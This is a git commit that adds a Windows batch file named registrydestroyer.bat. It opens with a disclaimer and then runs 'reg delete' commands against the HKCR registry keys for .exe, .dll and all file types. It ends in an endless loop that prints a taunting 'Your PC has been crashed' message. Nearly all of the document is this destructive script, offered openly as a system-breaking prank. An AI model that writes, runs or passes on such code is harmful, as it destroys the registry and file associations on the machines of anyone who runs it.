b0608214352d5b594400aa64ecf61f3a67fd9d2d
ThomasBOIisbest <107448223+ThomasBOIisbest@users.noreply.github.com>
2023-04-17 21:51:31 -0400

    Create registrydestroyer.bat

---
+++ registrydestroyer.bat
@@ -0,0 +1,12 @@
+ WARNING: This code will destroy your operating system's registry key making it unrecoverable and unusable. Highly recomend running this on a Virtual 
+ Machine. I am not responsible for ahy damages. Use at your own risk.
+ 
+ -----------------------------------------
+ 
+ @ECHO OFF
+ START reg delete HKCR/.exe
+ START reg delete HKCR/.dll
+ START reg delete HKCR/*
+ :MESSAGE
+ ECHO Your PC has been crashed.Your Dad.
+ GOTO MESSAGE
